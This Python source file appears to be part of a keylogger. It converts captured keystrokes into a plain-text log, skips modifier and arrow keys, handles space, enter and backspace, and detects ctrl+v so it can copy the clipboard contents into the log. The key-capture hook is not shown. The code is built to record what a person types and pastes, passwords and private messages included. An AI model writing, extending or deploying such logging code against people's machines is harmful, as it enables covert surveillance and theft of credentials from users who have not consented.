import clipboard
from text_file_processors.file_io import append_file, read_and_write_file

EXCLUDED_KEYS = {"caps lock", "shift", "right shift", "alt", "right alt", 
                 "up", "right", "down", "left", "home", "end", "page down", "page up", 
                 "delete", "print screen", "insert"}
SPACE_KEYS = {"space", "tab"}
DELETE_KEYS = {"backspace"}
BREAK_LINE_KEYS = {"enter"}
PASTING_KEYS = {"ctrl", "right ctrl", "v", "V"}

ctrl_pressed = False

def detect_pasted_data(message, log_save_location):
    global ctrl_pressed

    if message == "ctrl":
        ctrl_pressed = True
    
    elif message == "v" and ctrl_pressed:
        pasted_data = clipboard.paste()
        append_file(f"\nPasted: \n{pasted_data}", log_save_location)
        ctrl_pressed = False

def process_key_message(message, log_save_location):
    if message not in EXCLUDED_KEYS:
        if message in PASTING_KEYS:
            detect_pasted_data(message, log_save_location)
            
        elif message in SPACE_KEYS:
            append_file(" ", log_save_location)

        elif message in BREAK_LINE_KEYS:
            append_file("\n", log_save_location)

        elif message in DELETE_KEYS:
            read_and_write_file(log_save_location)

        else:
            append_file(message, log_save_location)
